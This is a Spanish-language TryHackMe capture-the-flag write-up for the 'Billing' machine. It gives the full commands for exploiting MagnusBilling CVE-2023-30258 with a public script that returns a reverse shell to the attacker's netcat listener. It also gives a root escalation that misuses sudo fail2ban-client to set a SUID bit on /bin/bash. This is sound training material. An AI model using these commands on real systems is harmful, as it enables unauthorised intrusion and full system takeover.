# Billing - Writeup

## 📋 Información General

- **Plataforma**: TryHackMe
- **Dificultad**: Fácil
- **Categoría**: CVE Exploitation | Research | Privilege Escalation
- **Fecha**: 24/02/2026
- **Tiempo empleado**: ~50 minutos
- **Autor**: Samuel Rodríguez aka Testarious

## 📝 Resumen

En este CTF nos vamos a centrar en la investigación de CVEs y lo importante que es hacer buenas búsquedas en Google para encontrar información relevante.

## 🔍 Reconocimiento y Enumeración

### Escaneo de Puertos

Empezamos escaneando los puertos de la máquina objetivo con Nmap.

```bash
# Comandos utilizados
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.112.173.45
nmap -sCV -p22,80,3306,5038 10.112.173.45
```
**Resultados:**

![Nmap](./content/screenshots/billing/nmap.png)


Como vemos en la imagen, los puertos abiertos son el 22 (SSH), el 80 (HTTP), el 3306 (MySQL) y el 5038 (Asterisk Call Manager). Y los escaneamos más a fondo para ver las versiones de los servicios.

En primer lugar visitamos la web que hay disponible en el puerto 80 y nos encontramos con un panel de login. 

![Web](./content/screenshots/billing/login.png)

Intentamos iniciar sesión con credenciales por defecto como "admin:admin" o "root:root" pero no funciona. Además, vemos que hay un enlace "Forgot Password" que nos lleva a una página de recuperación de contraseña, pero al poner un email cualquiera no nos llega ningún correo. También probamos a hacer el típico "SQL Injection" en el campo de email pero no funciona.

Realizamos un escaneo de directorios con Ffuf para ver si hay algún directorio oculto.

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.112.173.45/mbilling/FUZZ 
```

**Resultados:**

![Ffuf](./content/screenshots/billing/ffuf.png)

Vemos que hay algunos directorios interesantes como "/tmp", "/resources" y "/archive". Pero tras acceder a ellos y revisar su contenido, no vemos nada relevante.

## 💻 Explotación

Durante el reconocimiento de la web, viendo las tecnologías utilizadas para crearla, vemos que está hecha con la herramienta "Magnus Billing".

``
MagnusBilling es un sistema de facturación VoIP (Voice over IP) de código abierto (Open Source) y gratuito, diseñado para proveedores de servicios telefónicos basados en Asterisk. Permite gestionar clientes, tarifas, troncales y realizar monitoreo de llamadas masivas y SMS. Es una herramienta completa que facilita la administración y tarificación de servicios telefónicos.
``

### Vector de Ataque 1:

Así que decidimos buscar vulnerabilidades conocidas para esta herramienta y tras un poco de investigación y búsquedas en Google, encontramos que existe un CVE asociado (CVE-2023-30258) y un script en python que lo explota para esta herramienta.

➡️ [Script en Python](https://github.com/hadrian3689/magnus_billing_rce)

![GitHub](./content/screenshots/billing/github.png)

Procedemos a descargar el exploit y a ver el menú de ayuda para entender cómo usarlo.

```bash
python3 exploit.py -h
```

Tras ver como se usa el exploit, procedemos a ponernos en escucha con Netcat para recibir la reverse shell.

```bash
nc -nlvp 4444
```

Y luego ejecutamos el exploit.

```bash
python3 exploit.py -t 'http://10.112.173.45/mbilling/' -lh 10.11.16.151 -lp 4444
```

![Exploit](./content/screenshots/billing/exploit.png)

Y tras ejecutarse exitosamente, obtenemos una reverse shell como usuario "asterisk".

![Listen](./content/screenshots/billing/listen.png)

Tras ver los usuarios del sistema mirando el archivo `/etc/passwd`, vemos que hay un usuario llamado "magnus". El cual en su directorio `/home/magnus` tiene la flag del usuario.

![Flag](./content/screenshots/billing/user_flag.png)

## 🔐 Escalada de Privilegios

### Enumeración Local

Utilizamos el comando `sudo -l` para ver si el usuario `asterisk` puede ejecutar comandos como root.

```bash
sudo -l
```

![Sudo -l](./content/screenshots/billing/sudo.png)

### Método de Escalada

Como vemos en la imagen, el usuario `asterisk` puede ejecutar el comando `sudo /usr/bin/fail2ban-client` como root.

``Fail2ban es una herramienta que protege servicios (SSH, Apache, etc.) bloqueando direcciones IP tras varios intentos fallidos de autenticación.``

En esta parte, hacemos también un poco de investigación con Google para encontrar la forma de escalar privilegios con este binario. Y encontramos una serie de instrucciones que nos permiten ejecutar comandos como root.

```bash
# set asterisk-iptables → Modifica la jail llamada asterisk-iptables.
# action iptables-allports-ASTERISK → Especifica la acción que queremos modificar.
# actionban 'chmod +s /bin/bash' → Cambia el comando que se ejecutará cuando se banee una IP.

sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'

# Baneamos una IP cualquiera para forzar la ejecución del comando
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 10.10.1.120

# Nos movemos al directorio de action.d
cd /etc/fail2ban/action.d

# Ejecutamos bash con privilegios root
bash -p
```

![Root Flag](./content/screenshots/billing/root_flag.png)

Y finalmente, obtenemos la flag de root!

## 🛠️ Herramientas Utilizadas

| Herramienta | Versión | Uso específico |
|-------------|---------|----------------|
| nmap | 7.80 | Escaneo de puertos y servicios |
| ffuf | 1.3.1 | Fuzzing de directorios |
| python3 | 3.8 | Ejecución de comandos |


## 🏆 Conclusión

Este CTF nos enseña la importancia de realizar una buena investigación para identificar servicios vulnerables y encontrar CVEs asociados a ellos, así como exploits o scripts que los exploten para obtener acceso inicial. Luego, mediante la enumeración de permisos sudo, logramos escalar privilegios y obtener acceso total al sistema. Seguimos! 🚀